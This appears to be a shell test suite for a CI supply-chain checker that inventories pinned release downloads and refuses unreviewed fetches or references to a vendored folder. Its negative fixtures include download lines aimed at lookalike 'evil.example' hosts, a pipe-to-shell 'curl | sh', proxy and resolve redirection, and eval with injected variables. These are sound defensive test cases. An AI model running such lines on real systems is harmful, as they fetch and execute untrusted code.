    for decl in ('export "A=$%s"', "export 'A=$%s'", 'declare -x "A=$%s"', 'readonly "A=$%s"'):
        b = {path: "B=x.tgz\nC=y.tgz\n" + decl % "B" + "\n" + dl}; a = {path: "B=x.tgz\nC=y.tgz\n" + decl % "C" + "\n" + dl}
        assert inv.moved(inv.inventory(b), inv.inventory(a)), (path, decl)
for pre in ("x=$(printf '%s' ok); ", 'x=$(printf "%s" ok); ', "x=$(echo 'a)b'); ", 'x=$(echo "$(printf \'q\')"); ', "x=`echo 'a'`; "):
    items = []
    inv._step({"run": pre + 'curl https://github.com/o/r/releases/download/v1.2.3/x.tgz -o "$OUT"'}, items, {})
    assert {it.key for it in items} == {"tool:o/r/x.tgz@v1.2.3"}, (pre, [it.key for it in items])
PY

CASE="release downloads behind variables, round 6 findings: a variable read only inside \$(( )), a concrete download inside a command substitution, and the caller's env of a local composite call are part of the identity or leave the concrete key alone (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda n: {path: "N=" + str(n) + "\ncurl " + url + "tool-$((N)).tgz\n"}
    assert inv.moved(inv.inventory(sc(1)), inv.inventory(sc(2))), path
for run in ('body=$(curl ' + url + 'x.tgz -o "$OUT")', 'a=`curl ' + url + 'x.tgz -o "$OUT"`', 'b="$(curl ' + url + 'x.tgz -o x)"'):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz"}]}})
def tree(asset):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x", "env": {"ASSET": asset}}]}}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
assert inv.moved(inv.inventory(tree("old")), inv.inventory(tree("new")))
PY

CASE="release downloads behind variables, round 7 findings: an array element write and an indirect or indexed expansion are part of the identity, the inherited workflow env and matrix are part of a local action call's identity, a concrete download in double-quoted backticks or in a quoted URL followed by arguments keeps its concrete key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre, ref in (("A[0]=%s", "${A}"), ("ASSETS[0]=%s", "${ASSETS[0]}"), ("ASSETS[1]=%s", "${ASSETS[1]}"), ("SEL=%s", "${!P}")):
        extra = "P=SEL\n" if "!P" in ref else ""
        sc = lambda v: {path: extra + pre % v + "\ncurl " + url + ref + ".tgz -o x\n"}
        assert inv.moved(inv.inventory(sc("old")), inv.inventory(sc("new"))), (path, pre, ref)
    idx = lambda i: {path: "ASSETS[0]=a\nASSETS[1]=b\nIDX=" + str(i) + "\ncurl " + url + "${ASSETS[IDX]}.tgz\n"}
    assert inv.moved(inv.inventory(idx(0)), inv.inventory(idx(1))), path
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz -o x"}]}})
def tree(**kw):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x"}]}}}
    if "wenv" in kw: wf["env"] = {"ASSET": kw["wenv"]}
    if "jenv" in kw: wf["jobs"]["j"]["env"] = {"ASSET": kw["jenv"]}
    if "matrix" in kw: wf["jobs"]["j"]["strategy"] = {"matrix": {"asset": [kw["matrix"]]}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
for k in ("wenv", "jenv", "matrix"):
    assert inv.moved(inv.inventory(tree(**{k: "old"})), inv.inventory(tree(**{k: "new"}))), k
for run in ('body="`curl ' + url + 'x.tgz -o x`"', 'curl "' + url + 'x.tgz" -o "$OUT"', "curl '" + url + "x.tgz' -o \"$OUT\""):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, (run, sorted(inv.inventory({"bin/x.sh": run + "\n"})))
PY

CASE="release downloads behind variables, round 7 findings (seat A): a name written by printf -v or read, a name written to GITHUB_ENV by an earlier step, a concrete download inside a quoted program string, and a plain local action call under on: push keeps its key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda v: {path: "B=old C=new\nprintf -v A %s \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(sc("B"), sc("C")), ("printf -v", path)
    rd = lambda v: {path: "B=old\nC=new\nread -r A <<< \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(rd("B"), rd("C")), ("read", path)
def wf(v):
    steps = [{"run": "echo ASSET=$" + v + " >> \"$GITHUB_ENV\""}, {"run": "curl " + url + "${ASSET}.tgz"}]
    return {".github/workflows/x.yml": json.dumps({"on": "push", "env": {"B": "old", "C": "new"}, "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": steps}}})}
assert mv(wf("B"), wf("C")), "GITHUB_ENV"
for run in ("bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", 'bash -c "curl ' + url + 'x.tgz -o $OUT"'):
    its = list(inv.inventory({"bin/x.sh": run + "\n"}).values())     # a quoted program string that holds a variable is not parsed: its URL is unresolved (refused), never read as a concrete key
    assert len(its) == 1 and "$" in its[0].path, (run, [i.key for i in its])
plain = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo hi\n",
         ".github/workflows/x.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n"}
assert all(k.endswith("@(local)") for k in inv.inventory(plain) if k.startswith("action:local")), sorted(inv.inventory(plain))
PY

CASE="release downloads behind variables, round 7 findings (seat B): a quoted parenthesis, an indirection through an assignment and a multiline array cannot hide a changed asset because an unresolved asset is identified by its whole file (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
def wf(v):
    return {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          body=$(curl \"" + url + "tool)\"${" + v + "}.tgz)\n"}
assert mv(wf("A"), wf("B")), "quoted parenthesis"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    ind = lambda v: {path: "SEL=" + v + "\nP=SEL\nA=${!P}\ncurl " + url + "${A}.tgz\n"}
    assert mv(ind("old"), ind("new")), ("indirect", path)
    arr = lambda v: {path: "A=(\n  " + v + "\n)\ncurl " + url + "${A[0]}.tgz\n"}
    assert mv(arr("old"), arr("new")), ("array", path)
    # an edit anywhere in a file that holds an unresolved download is a moved item; a file with only concrete downloads is unchanged by an unrelated edit
    conc = lambda c: {path: "# " + c + "\ncurl " + url + "x.tgz -o x\n"}
    assert not mv(conc("a"), conc("b")), ("concrete", path)
    assert set(inv.inventory(conc("a"))) == {"tool:o/r/x.tgz@v1.2.3"}
PY

CASE="release downloads behind variables, round 8 findings (same class, nested quoting): a release URL inside a quoted program string that holds a variable, a substitution or a command separator is unresolved (whole-file identity, refused by the age judge), a variable after a quoted parenthesis is part of the name, and a plain quoted download keeps its key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
def wf(run): return {".github/workflows/p.yml": json.dumps({"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new", "OUT": "o"}, "steps": [{"run": run}]}}})}
# nested program strings holding $, a substitution or a separator: unresolved and refused
for run in ("bash -c 'curl \"" + url + "tool;${A}.tgz\"'", "bash -c \"curl " + url + "x.tgz;:>$OUT\"", "bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", "eval \"curl " + url + "x.tgz $EXTRA\""):
    its = list(inv.inventory(wf(run)).values())
    assert len(its) == 1 and ("$" in its[0].path or "`" in its[0].path), (run, [i.key for i in its])
    assert not age.judge_item(its[0])[0], run
# a variable after a quoted parenthesis changes the name
a = {"bin/x.sh": "curl '" + url + "tool)'${A}.tgz -o x\n"}; b = {"bin/x.sh": "curl '" + url + "tool)'${B}.tgz -o x\n"}
assert inv.moved(inv.inventory(a), inv.inventory(b))
# a plain quoted URL with an argument after it, and a program string with nothing dynamic, keep their keys
for run in ("curl \"" + url + "x.tgz\" -o \"$OUT\"", "bash -c 'curl " + url + "x.tgz -o x'"):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
PY

CASE="release downloads behind variables, round 9 finding (both seats, same class): a quote segment that merely BEGINS with the release URL inside a quoted program string (eval 'curl \"''https://.../tool;\${A}.tgz''\"') is not an ordinary URL operand: the name is unresolved (whole-file identity, refused by the age judge) and a variable edit is a moved item; a word that is the URL itself keeps its concrete key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
def tree(var, run):
    w = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new"}, "steps": [{"run": run.replace("VAR", var)}]}}}
    return {".github/workflows/p.yml": json.dumps(w)}
for run in ("eval 'curl \"''" + url + "tool;${VAR}.tgz''\"'",
            "sh -c 'curl \"'\"'" + url + "tool-${VAR}.tgz'\"'\"'",
            "bash -c \"curl '\"'\"'" + url + "tool;${VAR}.tgz'\"'\"'\""):
    a, b = inv.inventory(tree("A", run)), inv.inventory(tree("B", run))
    assert inv.moved(a, b), run
    it = next(iter(b.values()))
    assert not age.judge_item(it)[0], run
ok = tree("A", 'curl "' + url + 'x.tgz?download=${A}"')
assert all(it.step for it in inv.inventory(ok).values()), sorted(inv.inventory(ok))   # fail-closed: no refinement for a quoted word that is the URL (advisor 0442)
PY

# --- handoff 0452, exception 1 (owner ratified Oct 15, ratify/2026-10-15-download-age-three-exceptions.md): the vendored tree is not inventoried ---
vscript='#!/bin/sh\n$cmd docker run --rm --volume /x:/build generate:$GOOS\ngo run mksyscall.go\ncargo install ripgrep\n'
newcase vnd1 "$(printf 'import pathlib\nd = pathlib.Path(\"vendor/golang.org/x/sys/unix\")\nd.mkdir(parents=True, exist_ok=True)\n(d / \"mkall.sh\").write_text(\"%s\")' "$vscript")"
runck vnd1
CASE="an upstream script added under the top-level vendor/ is not inventoried (exit 0)"
check test "$rc" -eq 0
newcase vnd2 "$(printf 'import pathlib\nd = pathlib.Path(\"pkg/vendor/unix\")\nd.mkdir(parents=True, exist_ok=True)\n(d / \"mkall.sh\").write_text(\"%s\")' "$vscript")"
runck vnd2
CASE="the same script under pkg/vendor/ (not the top-level vendor/) is still refused (exit 1)"
check test "$rc" -eq 1
newcase vnd3 "$(printf 'import pathlib\nd = pathlib.Path(\"vendor-x\")\nd.mkdir(parents=True, exist_ok=True)\n(d / \"mkall.sh\").write_text(\"%s\")' "$vscript")"
runck vnd3
CASE="the same script under vendor-x/ is still refused (exit 1)"
check test "$rc" -eq 1
newcase vnd4 "$(printf 'import pathlib\nd = pathlib.Path(\"Vendor\")\nd.mkdir(parents=True, exist_ok=True)\n(d / \"mkall.sh\").write_text(\"%s\")' "$vscript")"
runck vnd4
CASE="the same script under Vendor/ (another case) is still refused (exit 1)"
check test "$rc" -eq 1

# --- the vendor/ skip is safe only while nothing outside vendor/ runs or installs from it. Held by a FILE-LEVEL rule (advisor, Oct 15, after eight rounds on command
#     scanning): a non-comment line of a scanned file outside vendor/ that names the vendored folder is refused unless the file is one of the exact listed paths.
vfile() { # NAME PATH 'LINE': base has no such file; head adds PATH (a .sh script, or a workflow step line) naming LINE
  python3 - "$1" "$2" "$3" <<'PY' > "$work/vc-$1.py"
import json, sys
name, path, line = sys.argv[1:4]
body = ("on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + line + "\n") if path.endswith(".yml") else ("#!/bin/sh\n" + line + "\n")
print("import pathlib\nroot = pathlib.Path('.')\n(root / 'vendor/example.test/dep').mkdir(parents=True, exist_ok=True)\n"
      "(root / 'vendor/example.test/dep/install.sh').write_text('go install example.test/tool@v1.2.3\\n')\n"
      "p = root / " + json.dumps(path) + "\np.parent.mkdir(parents=True, exist_ok=True)\np.write_text(" + json.dumps(body) + ")")
PY
  newcase "vc-$1" "$(cat "$work/vc-$1.py")"; runck "vc-$1"
}
for v in "run-script:bash vendor/example.test/dep/install.sh" "make-C:make -C vendor/example.test/dep" "python-module:python3 -m vendor.example.test.dep.run" \
         "cd-group:(cd vendor/example.test/dep \&\& make)" "sudo-long:sudo --user root bash vendor/example.test/dep/install.sh" \
         "abs-env:/usr/bin/env bash vendor/example.test/dep/install.sh" "process-subst:diff expected.txt <(bash vendor/example.test/dep/generate.sh)" \
         "sed-program:sed -f vendor/example.test/dep/transform.sed input.txt" "redirect-first:2>/dev/null bash vendor/example.test/dep/install.sh" \
         "pip-constraint:pip install -r requirements.txt -c vendor/example.test/dep/constraints.txt" "docker-bare:docker build vendor" \
         "list-only:ls vendor/" "cp-bare:cp -R vendor /tmp/v" "quoted-assign:CFLAGS=\"-O2 -g\" bash vendor/example.test/dep/install.sh"; do
  vfile "${v%%:*}" .github/workflows/w.yml "${v#*:}"
  CASE="a new workflow step that names the vendored folder is refused, whatever the command: ${v%%:*} (exit 1)"
  check test "$rc" -eq 1
  vfile "sh-${v%%:*}" tools/new.sh "${v#*:}"
  CASE="a new script that names the vendored folder is refused: ${v%%:*} (exit 1)"
  check test "$rc" -eq 1
done
for v in "quote-split:bash ven\"\"dor/example.test/dep/install.sh" "backslash-split:bash ven\\dor/example.test/dep/install.sh" \
         "bracket-letter:bash vendo[r]/example.test/dep/install.sh" "star-letter:bash v*ndor/example.test/dep/install.sh" \
         "question-letter:bash vend?r/example.test/dep/install.sh" "quoted-hash:printf %s ' #'; bash vendor/example.test/dep/install.sh" \
         "mod-word-not-go:ls mod vendor/example.test/dep" "mod-flag-path:ls -mod=vendor/example.test/dep" \
         "yaml-hex-escape:bash \\x76endor/example.test/dep/install.sh" "yaml-unicode-escape:bash ven\\u0064or/example.test/dep/install.sh"; do
  vfile "obf-${v%%:*}" .github/workflows/w.yml "${v#*:}"
  CASE="a spelling of the vendored folder that the shell or YAML reads as vendor/ is refused: ${v%%:*} (exit 1)"
  check test "$rc" -eq 1
done
# an executable surface the scan did not read (python helper, Makefile, Dockerfile) that names vendor/ is refused too
for f in "bin/helper.py:import subprocess\nsubprocess.run(['bash', 'vendor/example.test/dep/install.sh'])" "Makefile:all:\n\tbash vendor/example.test/dep/install.sh" "build/docker/Dockerfile.probe:RUN sh vendor/example.test/dep/install.sh"; do
  fp=${f%%:*}; body=${f#*:}
  python3 - "$fp" "$body" <<'PY' > "$work/vc-surf.py"
import json, sys
print("import pathlib\nroot = pathlib.Path('.')\n(root / 'vendor/example.test/dep').mkdir(parents=True, exist_ok=True)\n(root / 'vendor/example.test/dep/install.sh').write_text('go install example.test/tool@v1.2.3\\n')\n"
      "p = root / " + json.dumps(sys.argv[1]) + "\np.parent.mkdir(parents=True, exist_ok=True)\np.write_text(" + json.dumps(sys.argv[2].replace("\\n", "\n").replace("\\t", "\t") + "\n") + ")")
PY
  newcase vc-surf "$(cat "$work/vc-surf.py")"; runck vc-surf
  CASE="a python helper, Makefile or Dockerfile that names the vendored folder is refused: $fp (exit 1)"
  check test "$rc" -eq 1
done
vfile flow-style .github/workflows/w.yml '{run: "bash vendor/example.test/dep/install.sh"}'
CASE="a flow-style step that names the vendored folder is refused (exit 1)"
check test "$rc" -eq 1
for v in "tool-flag:go build -mod=vendor ./cmd/fscache" "go-mod-vendor:go mod vendor" "vendor-check:bash bin/vendor-check.sh" "comment:# vendor/ is skipped"; do
  vfile "ok-${v%%:*}" tools/new.sh "${v#*:}"
  CASE="a line that does not name the vendored folder (the tool's own words, a comment) is not refused: ${v%%:*} (exit 0)"
  check test "$rc" -eq 0
done
vfile trailing-comment tools/new.sh 'ls /tmp # vendor/x'
CASE="text after a # is still read (a quoted # is not a comment): a trailing mention is refused, the conservative side (exit 1)"
check test "$rc" -eq 1
vfile listed-file bin/vendor-check.sh 'ls vendor/'
CASE="a file on the exact list may name the vendored folder (exit 0)"
check test "$rc" -eq 0
vfile outbound-check bin/check-no-outbound.py 'dirs[:] = sorted(x for x in dirs if x != "vendor")'
CASE="the outbound check may name the vendored folder: it skips vendor/ by name (exit 0)"
check test "$rc" -eq 0
vfile outbound-test bin/check-no-outbound-test.sh 'mkdir -p "$root/internal/vendor/z"'
CASE="the outbound check's test may name the vendored folder: it builds a vendor/ fixture (exit 0)"
check test "$rc" -eq 0
vfile helper-listed bin/build-apk-helper.py '    if not os.path.isdir(src + "/vendor"):'
CASE="the build-apk helper may name the vendored folder: its vendor/ refusal moved out of build-apk.sh (exit 0)"
check test "$rc" -eq 0
vfile shape-listed bin/chain-test-shape.py '        "--modules $src/vendor/modules.txt",'
CASE="the shape file may name the vendored folder: it holds the build-apk.sh sbom line as exact text (exit 0)"
check test "$rc" -eq 0
vfile sibling-py bin/build-apk-helper2.py '    if not os.path.isdir(src + "/vendor"):'
CASE="an unlisted .py beside the listed helper (build-apk-helper2.py) naming the vendored folder is refused (exit 1)"
check test "$rc" -eq 1
vfile other-shape-py bin/chain-check-shape.py '        "--modules $src/vendor/modules.txt",'
CASE="an unlisted .py shape file (bin/chain-check-shape.py) that names the vendored folder is refused (exit 1)"
check test "$rc" -eq 1
python3 - "$root" <<'PY'
import importlib.util, sys
sys.path.insert(0, ".")
root = sys.argv[1]
spec = importlib.util.spec_from_file_location("pi", root + "/.github/agent/supply-chain/pin-inventory.py"); m = importlib.util.module_from_spec(spec); sys.modules["pi"] = m; spec.loader.exec_module(m)
files = {**m.tree_surfaces(root, None), **m.tree_files(root, None), **m.tree_scripts(root, None)}
hits = [k for k, _, _ in m.unmeasured_occurrences(files) if k[1] == "a line that names the vendored folder"]
assert not hits, hits[:3]
naming = {p for p, t in files.items() if not p.startswith((".github/agent/", "vendor/"))
          and any(m._names_vendor(l) for l in t.split("\n"))}
extra = m.vendor_list_extras(root, files)
import tempfile
# listed ahead of the chain landing: the govulncheck block (REQ-SCAN-012) names tools/govulncheck/vendor on the chain
# branch and not yet on main
ahead = ("bin/install-scanner.sh",)
_t = tempfile.mkdtemp(); os_ = __import__("os"); os_.makedirs(_t + "/bin")
# not built from ahead: a change of ahead must fail the assert below
_names = ("bin/install-scanner.sh", "bin/build-apk-helper.py", "bin/chain-test-shape.py",
          "bin/check-govulncheck.py", "bin/release-metadata.py")
for _p in _names: open(_t + "/" + _p, "w").write("nothing here\n")
_quiet = m.vendor_list_extras(_t, {_p: "nothing here\n" for _p in _names})
assert _quiet == sorted(_names), _quiet      # the rule itself still reports every quiet listed file
# ahead drops exactly one path and no other
assert [p for p in _quiet if p not in ahead] == [
    "bin/build-apk-helper.py", "bin/chain-test-shape.py", "bin/check-govulncheck.py", "bin/release-metadata.py"]
extra = [p for p in extra if p not in ahead]
assert not extra, "listed but names nothing: %s" % sorted(extra)
missing = naming - set(m._VENDOR_NAMING_FILES)
assert not missing, "names vendor but not listed: %s" % sorted(missing)
PY
CASE="today's tree passes the rule and the exact list holds no path that names nothing"
check test $? -eq 0
# --- advisor ruling Oct 16 (cache#347): a listed path ABSENT from the tree is accepted (the reviewed list pre-authorizes only that one exact path); a listed file that
#     EXISTS and does not name the folder is still refused.
python3 - "$work" <<'PY'
import importlib.util, os, sys, tempfile
sys.path.insert(0, ".")
spec = importlib.util.spec_from_file_location("pi", ".github/agent/supply-chain/pin-inventory.py"); m = importlib.util.module_from_spec(spec); sys.modules["pi"] = m; spec.loader.exec_module(m)
with tempfile.TemporaryDirectory(dir=sys.argv[1]) as td:
    os.makedirs(td + "/bin")
    open(td + "/bin/names.sh", "w").write("ls vendor/x\n")
    open(td + "/bin/quiet.sh", "w").write("echo hello\n")
    files = {"bin/names.sh": "ls vendor/x\n", "bin/quiet.sh": "echo hello\n"}
    m._VENDOR_NAMING_FILES = frozenset({"bin/names.sh", "bin/absent.sh"})
    assert m.vendor_list_extras(td, files) == [], "a listed file that names the folder, and a listed path that is absent, are both accepted"
    m._VENDOR_NAMING_FILES = frozenset({"bin/names.sh", "bin/quiet.sh", "bin/absent.sh"})
    assert m.vendor_list_extras(td, files) == ["bin/quiet.sh"], "a listed file that exists and does not name the folder is refused; the absent one is not"
PY
CASE="the exact list: an absent listed path is accepted and a present listed file that names nothing is refused"
check test $? -eq 0
# --- advisor ruling Oct 15 (owner rule 48 of Oct 9 and exception 2 of Oct 15): one narrow ruled-row kind for a LIVE fetch from the fixed host. A row of form `a download`
#     carries one of two rulings: the convention `text, not a command: ...` (a line that only mentions a tool), or `live fetch, owner ratified (Oct 9 rule 48 / Oct 15
#     exception 2): ...`, honored ONLY when every URL on the bound line is https on the host packages.wolfi.dev exactly. Any other ruling text on a download row rules nothing. Rows are read from the base branch only and bound to the file and the whole-line hash, so any edit of the line voids the row.
LIVEP='live fetch, owner ratified (Oct 9 rule 48 / Oct 15 exception 2): '
mkrowp() { # OUT FILE LINE RULINGPREFIX
  python3 - "$@" <<'PY'
import hashlib, json, re, sys
out, f, line, pref = sys.argv[1:5]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
json.dump({"exceptions": [], "unmeasured_text": [{"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": pref + "the key fetch of the refresh job"}]}, open(out, "w"))
PY
}
for v in "ok:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/wolfi-signing.rsa.pub:0" \
         "two-urls-same-host:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/a https://packages.wolfi.dev/os/b:1" \
         "other-host:curl -q -fsSL -o /tmp/k https://packages.example.com/os/wolfi-signing.rsa.pub:1" \
         "http:curl -q -fsSL -o /tmp/k http://packages.wolfi.dev/os/wolfi-signing.rsa.pub:1" \
         "host-lookalike:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev.evil.example/os/x:1" \
         "userinfo:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev@evil.example/os/x:1" \
         "port:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev:8443/os/x:1" \
         "second-url-other-host:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x https://evil.example/y:1" \
         "no-literal-url:curl -q -fsSL -o /tmp/k \"\$WOLFI/wolfi-signing.rsa.pub\":1" \
         "ftp-scheme:curl -q -fsSL -o /tmp/k ftp://packages.wolfi.dev/os/x:1" \
         "trailing-dot-host:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev./os/x:1" \
         "uppercase-host:curl -q -fsSL -o /tmp/k https://PACKAGES.wolfi.dev/os/x:1" \
         "quote-concat-authority:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev\"\"@evil.example/os/key\":1" \
         "quote-concat-suffix:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev\"\".evil.example/x\":1" \
         "extra-variable-operand:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/key \"\$OTHER_URL\":1" \
         "variable-url-with-comment:curl -q -fsSL -o /tmp/k \"\$KEY_URL\" # https://packages.wolfi.dev/os/key:1" \
         "schemeless-second-operand:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x evil.example/y:1" \
         "second-command-with-variable:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x; curl \"\$URL\":1" \
         "pipe-to-shell:curl -q -fsSL https://packages.wolfi.dev/os/x | sh:1" \
         "proxy-option:curl -q -fsSL -x http://p.example:3128 -o /tmp/k https://packages.wolfi.dev/os/x:1" \
         "resolve-option:curl -q -fsSL --resolve packages.wolfi.dev:443:10.0.0.1 -o /tmp/k https://packages.wolfi.dev/os/x:1" \
         "config-option:curl -q -fsSL -K /tmp/cfg -o /tmp/k https://packages.wolfi.dev/os/x:1" \
         "ok-per-package-variable-path:curl -q -fsSL -g -o /tmp/k \"https://packages.wolfi.dev/os/\$p\":0" \
         "ok-per-package-braced-variable:curl -q -fsSL -g -o /tmp/k \"https://packages.wolfi.dev/os/\${p}\":0" \
         "ok-per-package-concatenated-words:curl -q -fsSL -g -o /tmp/k \"https://packages.wolfi.dev/os/\"\"\$p\":0" \
         "per-package-variable-without-globoff:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/os/\$p\":1" \
         "per-package-globoff-is-an-output-name:curl -q -fsSL -o -g \"https://packages.wolfi.dev/os/\$p\":1" \
         "ok-literal-url-needs-no-globoff:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x:0" \
         "var-prefix-without-slash:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/os\$p\":1" \
         "var-prefix-without-os:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/\$p\":1" \
         "two-variables:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/os/\$a\$b\":1" \
         "variable-then-literal:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/os/\$p/x\":1" \
         "variable-host:curl -q -fsSL -o /tmp/k \"https://\$h/os/\$p\":1" \
         "variable-in-authority:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev\$p\":1" \
         "default-expansion:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/os/\${p:-x}\":1" \
         "format-string:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/%s/APKINDEX.tar.gz:1" \
         "fstring-text:curl -q -fsSL -o /tmp/k f\"https://packages.wolfi.dev/os/{p}\":1" \
         "command-substitution-path:curl -q -fsSL -o /tmp/k \"https://packages.wolfi.dev/os/\$(cat /tmp/p)\":1" \
         "other-host-with-variable:curl -q -fsSL -o /tmp/k \"https://packages.example.com/os/\$p\":1" \
         "no-disable-first:curl -fsSL -o /tmp/k https://packages.wolfi.dev/os/x:1" \
         "disable-not-first:curl -fsSL -q -o /tmp/k https://packages.wolfi.dev/os/x:1" \
         "unquoted-output-variable:curl -q -fsSL -o \$tmp/key https://packages.wolfi.dev/os/key:1" \
         "unquoted-braced-output-variable:curl -q -fsSL -o \${tmp}/key https://packages.wolfi.dev/os/key:1" \
         "brace-expansion-output:curl -q -fsSL -o /tmp/k{1..2} https://packages.wolfi.dev/os/key:1" \
         "glob-output:curl -q -fsSL -o /tmp/k* https://packages.wolfi.dev/os/key:1" \
         "unquoted-url-variable:curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/\$p:1" \
         "ok-quoted-output-variable:curl -q -fsSL -o \"\$tmp/key\" https://packages.wolfi.dev/os/key:0" \
         "ok-with-fixed-flags-and-die:curl -q -fsSL -g --max-filesize 65536 --max-time 60 --proto =https --tlsv1.2 -o \"\$tmp/live-key.pub\" https://packages.wolfi.dev/os/wolfi-signing.rsa.pub || die \"could not fetch the live Wolfi signing key\" 1:0"; do
  nm=${v%%:*}; rest=${v#*:}; line=${rest%:*}; want=${rest##*:}
  mkrowp "$work/lf-$nm.json" bin/fetch.sh "$line" "$LIVEP"
  twoc "lf-$nm" bin/fetch.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"$line"$'\n'
  edck "lf-$nm" "$work/lf-$nm.json"
  CASE="live-fetch row, $nm: exit $want"
  check test "$rc" -eq "$want"
done
mkrowp "$work/lf-text.json" bin/fetch.sh "curl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x" "text, not a command: "
twoc lf-text bin/fetch.sh $'#!/bin/sh\n' $'#!/bin/sh\ncurl -q -fsSL -o /tmp/k https://packages.wolfi.dev/os/x\n'
edck lf-text "$work/lf-text.json"
CASE="a row with the text convention still rules a line, whatever the line (exit 0)"
check test "$rc" -eq 0
